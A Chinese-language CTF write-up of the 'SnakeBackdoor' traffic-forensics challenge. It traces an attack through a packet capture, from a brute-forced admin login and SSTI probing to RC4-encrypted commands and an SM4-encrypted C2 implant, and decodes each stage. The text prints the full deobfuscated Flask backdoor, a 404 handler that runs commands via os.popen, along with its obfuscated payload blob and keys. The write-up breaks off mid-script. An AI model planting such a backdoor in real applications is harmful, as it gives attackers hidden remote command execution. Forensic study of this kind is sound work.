+++
title = "流量分析-SnakeBackdoor"
date = 2026-06-16T16:06:48+08:00
draft = false
description = "ccb初赛流量题"
tags = ["CTF", "Misc", "应急响应", "取证"]
categories = ["CTF", "Misc", "应急响应", "取证"]
series = ["CTF", "Misc", "应急响应", "取证"]
pin = false
+++

# SnakeBackdoor-1


要找出攻击者爆破成功的后台密码   
一般是POST传参 的

 http.request.method == "POST"

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228154805724.png)

然后我们找到在登录 /admin/login和  和/admin/preview的分界点的地方找到这一条流量

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228155857858.png)

打开发现是302重定向，而且是found

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228160023302.png)


可以看到flag已经爆破成果了

zxcvbnm123

flag{zxcvbnm123}

# SnakeBackdoor-2

可以看到打进来了使用了ssti的经典探测语句

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228160911957.png)


然后再分组1779里找到config配置文件，这是ssti模板的经典配置文件

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228163516567.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228163440402.png)


然后发现疑似SECRET_KEY

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228163602405.png)

用随波逐流进行解密

![{343C2614-D0F5-401B-B796-E62D01D78010}.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/%7B343C2614-D0F5-401B-B796-E62D01D78010%7D.png)

然后发现那个SECRET_KEY  的   硬编码

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228164051346.png)

c6242af0-6891-4510-8432-e1cdf051f160

flag{c6242af0-6891-4510-8432-e1cdf051f160}


# SnakeBackdoor-3

找到下一流，发现一个超长的payload

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228165106031.png)

分析可知这是一个首先是一个base64传入的，我们拿那个魔法厨子进行解密

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228165420387.png)


分析可知，他这个是反转+ base64 + zlib  变换成的

```
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
```


然后我们进行逆向进行解密，这里搓一个脚本，原理就是先反转回来，再base64解密，再zilb解压缩，下面的里面的脚本是已经解混淆后的几层脚本



```python
import sys

mod_zlib = __import__('zlib')

mod_b64 = __import__('base64')

  

data_layer = b'=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'

  

def _decode_step(blob):

    try:

        reversed_data = blob[::-1]

        decoded_b64 = mod_b64.b64decode(reversed_data)

        decompressed = mod_zlib.decompress(decoded_b64)

        return decompressed.decode('utf-8')

    except Exception:

        return None

  

def _extract_payload(code_str):

    marker_start = "b'"

    marker_end = "'"

    idx_s = code_str.find(marker_start)

    if idx_s == -1:

        return None

    idx_s += len(marker_start)

 

    idx_e = code_str.rfind(marker_end, idx_s)

    if idx_e <= idx_s:

        return None

    inner = code_str[idx_s:idx_e]

    return inner.encode('utf-8')

  

current = data_layer

for depth in range(50):

    layer_num = depth + 5

    result = _decode_step(current)

    if result is None:

        print(f"Stopped at layer {layer_num}: decoding failed")

        break

  

    preview = result[:60].replace('\n', '\\n')

    print(f"--- Layer {layer_num} ---")

    print(f"Preview: {preview}")

  

    if not result.strip().startswith('exec((_)('):

        print("Final Code Reached!")

        print(result)

        break

  

    next_blob = _extract_payload(result)

    if next_blob is None:

        print(f"Stopped at layer {layer_num}: could not extract inner blob")

        break

    current = next_blob
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228172343824.png)


解密过后发现，他把一段404 错误处理器后门写进内存中。而且 POST 的 data字段是加密后的命令数据，而且他那个加密方式是经典的RC4

```python
--- Layer 5 ---
Preview: exec((_)(b'PSIFNPw//++8+36WNjBKfnmx5GmS/AUo5omk7OhbJ/dGZWEN8
--- Layer 6 ---
Preview: exec((_)(b'==QnqJeq/tv///j8VibI73w5tz25UsKwLHRkszEGErUvgEYh/
--- Layer 7 ---
Preview: exec((_)(b'=ANUuK4H//33n7vW3i5NhyJ/zBr6lqHAREH4+iWbXcEwwSPmp
--- Layer 8 ---
Preview: exec((_)(b'=IwMoP5B//77z/fLbx8HQ7tf6g9YA0jG9iT8dZ/+3bIkqoBft
--- Layer 9 ---
Preview: exec((_)(b'==wzXE4j/tv///j8Vjbw5Xv0Zk4mwMA0pwSUj/Z0pz/jflM6j
--- Layer 10 ---
Preview: exec((_)(b'==gf/jHnB8/3vfu+1+mNfoSfzqR4ainfwfbuICpKpxbOTByqo
--- Layer 11 ---
Preview: exec((_)(b'=4l4BJzA//775/fLLx4C82tWaVfMaiRi3X5SRTznOh8AIgvzA
--- Layer 12 ---
Preview: exec((_)(b'wRcFh9z+9z//VVq1eTDOWaZY48LAD9trXERNa6mNA1shp6zFC
--- Layer 13 ---
Preview: exec((_)(b'=Qys2Vx/3v/+/vySMX0/dNKm4Weg7Uy+3YMntRznkdn7y87In
--- Layer 14 ---
Preview: exec((_)(b'eNJ8C/R/+7/fLL18hd+z2YrrcYbQfLlFuGOGZS79u9txL/o0M
--- Layer 15 ---
Preview: exec((_)(b'==QG6RexB8/77z//VWq5jCqbQ2uQyBmLtQ2+oFs4gMokD7Dv2
--- Layer 16 ---
Preview: exec((_)(b'=k1XWo6f77///U+Kx17Qov1CbxAJXdJ3HxwYVnaz8XIWjs8Ns
--- Layer 17 ---
Preview: exec((_)(b'=81QxnXA//++8/vlnO/Bnvcc26aWKe53G16SMesB8mWIlMzYT
--- Layer 18 ---
Preview: exec((_)(b'=g+LKB4P9//ffqe18+y3irYamVGlrevH4dGNZKWHbS50IdlFQ
--- Layer 19 ---
Preview: exec((_)(b'=giEuGZA+/3PvWMB73PiQNXSXdCqDZNRHTjEgmR5CXrH7Tsga
--- Layer 20 ---
Preview: exec((_)(b'==gy2/gLB8/3vfe+a1pYIoPHsz8KWia06/7kSqyzO2gKf3os6
--- Layer 21 ---
Preview: exec((_)(b'==QxffJ7P8/f/+r81qLz79Yx5/qnM1LMSZg/51JEzn3OaS8+s
--- Layer 22 ---
Preview: exec((_)(b'xqMlG9397nP/Sd56PUQP3OV0hJp9Jk5BGJz8TxcK1aF2uShTg
--- Layer 23 ---
Preview: exec((_)(b'=ExrGc4D+7f/+zSzi+M+S6hikGZxb8AoqBrzT0elQGxOiHoip
--- Layer 24 ---
Preview: exec((_)(b'qTZ7V9x+97/f2UW8gJ6TvOY4EYXURLXtFKe7bxrSf+4RYUnFE
--- Layer 25 ---
Preview: exec((_)(b'U/3rafR/9nv/edoWKWCB0tmP8F9QqXYHmELhTXeSnQCBLOeed
--- Layer 26 ---
Preview: exec((_)(b'=AfXEXyB//nf/d0UtXMaRUT4EYRycJCq5onYKhSoR7dLp2JXo
--- Layer 27 ---
Preview: exec((_)(b'==AfG1prD4v/87/LdJadt+KSeir4iodsXZ+4ztImm3TCqQvlm
--- Layer 28 ---
Preview: exec((_)(b'K7yl38/7v/s+NndIGi6MSJN4NaSKvobvNXnDaV2N8JLy79In1
--- Layer 29 ---
Preview: exec((_)(b'=M7FhnyD93/84D7Q6/P2TVDWii5GK8Qw3CFmc1IQc3wL6PGRp
--- Layer 30 ---
Preview: exec((_)(b'==gT8zKNH8/f+9vF96iRe0DfyF4+7ALRX8IiO4a/qr75W84Fy
--- Layer 31 ---
Preview: exec((_)(b'PNl2cvg+JMo6B/FRrkTxuoLcf3hu2pT3g06TtLvCrD8YuEodl
--- Layer 32 ---
Preview: global exc_class\nglobal code\nimport os,binascii\nexc_class, c
Final Code Reached!
global exc_class
global code
import os,binascii
exc_class, code = app._get_exc_class_and_code(404)
RC4_SECRET = b'v1p3r_5tr1k3_k3y'
def rc4_crypt(data: bytes, key: bytes) -> bytes:
        S = list(range(256))
        j = 0
        for i in range(256):
                j = (j + S[i] + key[i % len(key)]) % 256
                S[i], S[j] = S[j], S[i]
        i = j = 0
        res = bytearray()
        for char in data:
                i = (i + 1) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                res.append(char ^ S[(S[i] + S[j]) % 256])
        return bytes(res)
def backdoor_handler():
        if request.headers.get('X-Token-Auth') != '3011aa21232beb7504432bfa90d32779':
                return "Error"
        enc_hex_cmd = request.form.get('data')
        if not enc_hex_cmd:
                return ""
        try:
                enc_cmd = binascii.unhexlify(enc_hex_cmd)
                cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore')
                output_bytes = getattr(os, 'popen')(cmd).read().encode('utf-8', errors='ignore')
                enc_output = rc4_crypt(output_bytes, RC4_SECRET)
                return binascii.hexlify(enc_output).decode()
        except:
                return "Error"
app.error_handler_spec[None][code][exc_class]=lambda error: backdoor_handler()
```

然后那个密钥字符串key，我们可以直接可以看到那个RC4的key

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228173348803.png)


v1p3r_5tr1k3_k3y

flag{v1p3r_5tr1k3_k3y}



# SnakeBackdoor-4


根据3可以知道加密后的data是被rc4加密的，我们直接逆向解密出来
所以找到那个后面传输的数据进行提取出来

查询语句

http.request.method == "POST" && http contains "X-Token-Auth"


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228174659621.png)

然后提取出来

a6bc
a3ab330fb285
acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534
bab6694ba3c938e64b8d257b7cccee460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a
a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351
acb07e4db7c93ece4bcc37246687ae0649614caa3430ce4b
e0ac7e52fc996cc2038c2d7a3899ed

然后下面是根据3逆向搓出来的RC4脚本

```python
  

import binascii

  

RC4_SECRET = b'v1p3r_5tr1k3_k3y'

  

def rc4_crypt(data: bytes, key: bytes) -> bytes:

    S = list(range(256))

    j = 0

    for i in range(256):

        j = (j + S[i] + key[i % len(key)]) % 256

        S[i], S[j] = S[j], S[i]

  

    i = j = 0

    out = bytearray()

    for b in data:

        i = (i + 1) % 256

        j = (j + S[i]) % 256

        S[i], S[j] = S[j], S[i]

        out.append(b ^ S[(S[i] + S[j]) % 256])

    return bytes(out)

  

def decrypt_hex(hex_str: str) -> bytes:

    raw = binascii.unhexlify(hex_str.strip())

    return rc4_crypt(raw, RC4_SECRET)

  

def encrypt_hex(data: bytes) -> str:

    enc = rc4_crypt(data, RC4_SECRET)

    return binascii.hexlify(enc).decode()

  

if __name__ == "__main__":
	hex_payload = "a6bc
     a3ab330fb285
     acad614ef3d82c8445d275713899f04d0d3819fc3726cf57634b189e0e95cc1f93e57656105246251f453a8396a43a6534
bab6694ba3c938e64b8d257b7cccee460f6347f4363ed21c300c099f129b99028eb57408024e1c32061a
a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351
acb07e4db7c93ece4bcc37246687ae0649614caa3430ce4b
e0ac7e52fc996cc2038c2d7a3899ed
"



plaintext = decrypt_hex(hex_payload)

print("[+] Decrypted bytes:")

print(plaintext)
```

然后解密可得

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228175837336.png)


可以知道用密码解压shell.zip并且移动到tmp临时目录，然后将里面的shell木马重命名了python3.13,然后给他加权了，然后再执行，所以木马执行的本体文件是python3.13



flag{python3.13}



# SnakeBackdoor-5


要想提取驻留的木马本体文件，通过逆向分析找出木马样本通信使用的加密密钥

我们通过流量包导出shell.zip文件

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228180354993.png)

解压时发现密码

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228180427402.png)

根据4可知密码为   nf2jd092jd01

然后进行查壳，发现无壳，且是64位
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228180525795.png)

直接拖到ida当中，映入眼帘后可以看到的是那个外联的ip地址，192.168.1.201 且端口为58782

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228181651824.png)

然后我们再跳转到这个函数，发现他是16位的ECB的模式,且是SM4模式,而且分析可知
可以定位到 srand()函数，结合后续对称加密逻辑可判断，程序在运行时使用外部输入的 seed 初始化伪随机数生成器，并连续调用rand()函数 生成 16 字节会话密钥

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228185731259.png)

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228183329834.png)
![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228183414003.png)


![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228181928223.png)


还原成解密逻辑

```python
uint8_t key[16];

srand(seed);          
for (int i = 0; i < 4; i++) {
    uint32_t r = rand();
    *(uint32_t *)(key + i*4) = r;   
}
```


然后我们回到流量中进行筛选

ip.addr == 192.168.1.201 and tcp.port == 58782

查看服务器发送的包，发现有4字节的seeed
34952046,然后发送16字节的密钥到木马上进行通信，那也印证了我们逆向木马的分析

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228183648210.png)

然后我们写出解密脚本

```python
import ctypes

import struct

  
def derive_sm4_key_from_seed(seed: int) -> bytes:

    libc = ctypes.CDLL("libc.so.6")

    libc.srand.argtypes = [ctypes.c_uint]

    libc.rand.restype = ctypes.c_int


    libc.srand(ctypes.c_uint(seed))


    key = bytearray()

    for _ in range(4):

        r = libc.rand() & 0xffffffff

        key += struct.pack("<I", r)

  
    return bytes(key)

  

if __name__ == "__main__":

    seed = 0x34952046

    key = derive_sm4_key_from_seed(seed)

    print(f"[+] SM4 Key  : {key.hex()}")
```

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228184924997.png)


flag{ac46fb610b313b4f32fc642d8834b456}

# SnakeBackdoor-6


由5可知他的key为  ac46fb610b313b4f32fc642d8834b456，又因为采用了SM4-CBC算法

所以需要那个SBOX,FK,CK


我们继续回到那个流，这里涉及到了C2的加密通信内容

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20251228190531209.png)

然后写一个脚本对他进行解密

```python
  

from typing import List



SBOX = [

    0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,

    0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,

    0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,

    0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,

    0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,

    0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,

    0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,

    0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,

    0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,

    0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,

    0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,

    0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51,

    0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8,

    0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0,

    0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84,

    0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48

]

  

FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]

CK = [

    0x00070e15,0x1c232a31,0x383f464d,0x545b6269,

    0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9,

    0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,

    0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9,

    0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,

    0x30373e45,0x4c535a61,0x686f767d,0x848b9299,

    0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,

    0x10171e25,0x2c333a41,0x484f565d,0x646b7279

]

  

def rotl(x, n): return ((x << n) & 0xffffffff) | (x >> (32 - n))

def tau(a): return sum(SBOX[(a >> (24 - 8*i)) & 0xff] << (24 - 8*i) for i in range(4))

def L(b): return b ^ rotl(b,2) ^ rotl(b,10) ^ rotl(b,18) ^ rotl(b,24)

def Lp(b): return b ^ rotl(b,13) ^ rotl(b,23)

  

def sm4_key_schedule(key: bytes):

    MK = [int.from_bytes(key[i*4:(i+1)*4],'big') for i in range(4)]

    K = [MK[i] ^ FK[i] for i in range(4)]

    for i in range(32):

        K.append(K[i] ^ Lp(tau(K[i+1] ^ K[i+2] ^ K[i+3] ^ CK[i])))

    return K[4:]

  

def sm4_decrypt_block(block: bytes, rk):

    X = [int.from_bytes(block[i*4:(i+1)*4],'big') for i in range(4)]

    for i in range(32):

        X.append(X[i] ^ L(tau(X[i+1] ^ X[i+2] ^ X[i+3] ^ rk[31-i])))

    return b''.join(X[i].to_bytes(4,'big') for i in range(4,8))

  
  

SM4_KEY = bytes.fromhex("ac46fb610b313b4f32fc642d8834b456")

  

def decrypt_c2(hex_blocks: List[str]):

    rk = sm4_key_schedule(SM4_KEY)

    out = b""

